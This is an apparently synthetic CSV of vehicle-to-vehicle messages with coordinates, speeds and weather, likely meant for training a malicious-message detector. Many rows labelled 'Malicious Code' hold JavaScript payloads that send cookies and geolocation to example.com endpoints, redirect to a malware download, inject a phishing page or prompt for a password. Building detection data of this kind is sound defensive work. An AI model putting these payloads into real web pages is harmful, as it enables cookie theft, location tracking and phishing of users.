Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
21:29.0,vehicle_12,truck,47.6230256,-122.3873624,30.95565472,Traffic Update,At-a-standstill traffic on Interstate 40.,foggy
39:00.8,vehicle_80,motorcycle,47.61942373,-122.3828362,99.60598088,Safety,Avoid Debris.,snowy
49:31.5,vehicle_95,motorcycle,47.66166906,-122.3999798,115.5820988,Safety,Avoid Road construction.,clear
42:50.0,vehicle_55,car,47.61219202,-122.3359567,9.93623814,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
13:15.1,vehicle_70,truck,47.6995736,-122.306179,87.04501246,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
23:55.1,vehicle_95,car,47.68220956,-122.3940515,25.71654211,Safety,Be cautious of Icy roads.,clear
29:31.4,vehicle_47,motorcycle,47.61223729,-122.3186303,54.38685884,Safety,Watch out for Spills.,clear
05:40.4,vehicle_19,motorcycle,47.65561931,-122.3928134,66.69882673,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
47:59.1,vehicle_24,truck,47.62564929,-122.3155321,80.23502487,Safety,Be aware of Road construction.,foggy
15:44.0,vehicle_35,motorcycle,47.69443898,-122.3125565,32.01224749,Traffic Update,Traffic is at a standstill on the northbound lanes of County Road 1.,clear
57:12.8,vehicle_50,car,47.64717617,-122.3260876,93.86771446,Emergency Update,Road collapse in your locality.,foggy
40:31.1,vehicle_76,car,47.64648989,-122.3779538,108.0196191,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
57:27.8,vehicle_49,motorcycle,47.61131145,-122.3496697,65.79317977,Emergency Update,Natural disaster in your vicinity.,snowy
59:03.1,vehicle_76,car,47.65758718,-122.3009739,110.7765817,Emergency Update,Civil unrest in your locality.,snowy
20:14.2,vehicle_95,car,47.65165746,-122.3926975,33.53881127,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
58:49.1,vehicle_60,motorcycle,47.60206992,-122.3639222,104.3373576,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
21:42.0,vehicle_24,motorcycle,47.63891177,-122.3203736,98.25659842,Emergency Update,Terrorist attack in your neighborhood.,clear
22:56.7,vehicle_44,truck,47.66542002,-122.3175982,116.296915,Safety,Be cautious of Detours.,rainy
01:17.7,vehicle_10,truck,47.65976658,-122.3978708,79.31285496,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
46:09.6,vehicle_70,motorcycle,47.61470042,-122.35486,84.73561934,Emergency Update,Evacuation order in your locale.,foggy
32:20.0,vehicle_78,truck,47.69689346,-122.321021,31.52718102,Traffic Update,Gridlock on Autostrada A1.,snowy
03:02.3,vehicle_9,car,47.69598038,-122.3305336,110.3082396,Safety,Stay informed about Uneven surfaces.,foggy
51:26.1,vehicle_26,car,47.61097282,-122.3695486,45.92778927,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
34:54.7,vehicle_70,motorcycle,47.69848934,-122.3960656,8.528879874,Traffic Update,Traffic is at a standstill on the northbound lanes of Avenue.,rainy
51:38.4,vehicle_6,car,47.6936587,-122.3884324,83.29983251,Emergency Update,Infrastructure collapse in your vicinity.,clear
10:12.2,vehicle_94,car,47.62258939,-122.3255002,64.16099309,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
37:20.0,vehicle_89,truck,47.64029096,-122.3982101,6.674703707,Emergency Update,Water crisis in your neighborhood.,rainy
21:28.2,vehicle_88,car,47.65215074,-122.3082789,17.72399783,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
47:14.6,vehicle_99,truck,47.61216678,-122.3268982,43.00641401,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
44:31.1,vehicle_42,truck,47.68690142,-122.3434084,66.58768337,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
54:17.0,vehicle_50,car,47.66187884,-122.3862481,42.18304977,Traffic Update,Heavy congestion on Boulevard.,clear
58:32.3,vehicle_44,truck,47.60118892,-122.380283,72.3359778,Safety,Beware of Road construction.,clear
11:54.8,vehicle_45,truck,47.68483251,-122.3047003,99.49599485,Emergency Update,Bridge collapse nearby.,snowy
24:13.0,vehicle_97,motorcycle,47.62219558,-122.3496198,103.3398797,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
22:27.0,vehicle_79,truck,47.61108103,-122.3752775,26.05889624,Emergency Update,Hazardous materials incident in your part of town.,snowy
20:50.5,vehicle_83,car,47.62089343,-122.313306,110.8507502,Safety,Watch out for Road closures.,clear
11:58.1,vehicle_1,truck,47.67254257,-122.3419281,42.0081624,Traffic Update,Heavy congestion on State Highway 1.,foggy
14:27.6,vehicle_85,car,47.60308012,-122.3292593,107.4484921,Emergency Update,Multi-vehicle accident in your locale.,foggy
01:52.7,vehicle_1,car,47.67519283,-122.3573203,60.15676685,Safety,Beware of Black ice.,rainy
29:24.8,vehicle_79,car,47.66802382,-122.3406601,119.3890885,Emergency Update,Civil unrest in your jurisdiction.,foggy
47:43.4,vehicle_87,car,47.65462397,-122.3816888,39.63454087,Traffic Update,Slow traffic on Main Street.,foggy
31:09.4,vehicle_73,truck,47.65292077,-122.383754,94.40993021,Traffic Update,Slow traffic on I-95.,clear
53:04.5,vehicle_83,motorcycle,47.67477766,-122.3368969,45.9506666,Traffic Update,Gridlock on US-101.,rainy
22:44.5,vehicle_25,truck,47.69328998,-122.3161578,3.91216036,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
44:08.7,vehicle_96,truck,47.6115426,-122.3781317,29.77578334,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
46:49.1,vehicle_8,motorcycle,47.67128977,-122.3680144,74.47818955,Safety,Beware of Wildlife crossing.,clear
47:19.5,vehicle_13,car,47.65533996,-122.3232886,65.79403131,Emergency Update,Natural disaster in your region.,rainy
37:41.0,vehicle_52,car,47.61414857,-122.3193134,17.1088899,Safety,Take precautions against Accidents.,snowy
30:13.6,vehicle_84,car,47.61717315,-122.3543736,39.50335001,Traffic Update,Traffic is at a standstill on the northbound lanes of City Road 1.,rainy
46:35.5,vehicle_42,motorcycle,47.68001401,-122.3024407,23.67173093,Emergency Update,Road collapse in your part of town.,rainy
32:32.2,vehicle_41,car,47.63295066,-122.3950517,116.4146107,Emergency Update,Head-on collision locally.,clear
22:51.2,vehicle_39,car,47.67109484,-122.3091127,29.00741755,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
01:38.4,vehicle_51,motorcycle,47.66017983,-122.3481644,92.43704247,Safety,Exercise caution regarding Fallen trees.,snowy
23:23.7,vehicle_55,car,47.65726597,-122.3060879,80.78117465,Emergency Update,Detour due to emergency in your jurisdiction.,clear
12:19.5,vehicle_98,truck,47.68301248,-122.3337735,107.0764022,Safety,Beware of Debris.,snowy
40:05.8,vehicle_72,truck,47.6380565,-122.3521866,100.267606,Safety,Take precautions against Slippery roads due to rain or snow.,rainy
45:39.2,vehicle_30,truck,47.66218068,-122.3005069,68.76500515,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
17:25.9,vehicle_29,motorcycle,47.67686831,-122.3187004,81.91659424,Traffic Update,Severe traffic congestion on State Highway 1.,foggy
04:00.1,vehicle_70,truck,47.67592758,-122.3931226,82.83029046,Safety,Stay away from Road closures.,foggy
51:14.6,vehicle_67,truck,47.63249726,-122.3423788,108.8715158,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
24:05.9,vehicle_16,truck,47.60252907,-122.305517,9.36622563,Safety,Exercise caution regarding Potholes.,rainy
03:19.7,vehicle_87,motorcycle,47.64291462,-122.3025862,31.23071329,Safety,Take precautions against Accidents.,rainy
07:35.4,vehicle_36,truck,47.60964684,-122.3203113,58.76309922,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
08:08.4,vehicle_71,motorcycle,47.67000489,-122.3222259,114.4833083,Emergency Update,Terrorist attack in your community.,foggy
50:37.9,vehicle_17,car,47.63126761,-122.3295808,5.626979229,Traffic Update,Traffic bottleneck on Lane.,foggy
28:28.8,vehicle_67,truck,47.66966538,-122.3361656,23.57151215,Emergency Update,Natural disaster in your locality.,snowy
55:58.0,vehicle_84,motorcycle,47.65502027,-122.3720535,80.54185368,Emergency Update,Traffic accident in your locality.,snowy
17:04.2,vehicle_16,truck,47.64781336,-122.3314639,118.899386,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
49:36.8,vehicle_73,truck,47.65538615,-122.3172931,4.750985746,Emergency Update,Major traffic collision in your neighborhood.,rainy
30:49.8,vehicle_84,car,47.6232249,-122.3942937,34.7429965,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
07:40.8,vehicle_50,car,47.60409398,-122.3319492,99.89813429,Traffic Update,Slow traffic on Avenue.,snowy
03:45.8,vehicle_7,truck,47.62522071,-122.3046263,23.13448238,Traffic Update,At-a-standstill traffic on US-101.,foggy
23:11.1,vehicle_6,motorcycle,47.61525224,-122.3771695,16.95272114,Traffic Update,Stop-and-go traffic on Boulevard.,snowy
08:37.7,vehicle_70,motorcycle,47.63956094,-122.3463245,41.81469405,Emergency Update,Chemical spill in your part of town.,clear
33:51.4,vehicle_65,car,47.61302207,-122.3331188,26.03068456,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
39:03.9,vehicle_7,motorcycle,47.60748137,-122.3072162,85.56988956,Emergency Update,Multi-vehicle accident in your surrounding area.,snowy
48:06.0,vehicle_90,car,47.65166952,-122.3927591,16.43653277,Safety,Be aware of Slippery roads due to rain or snow.,snowy
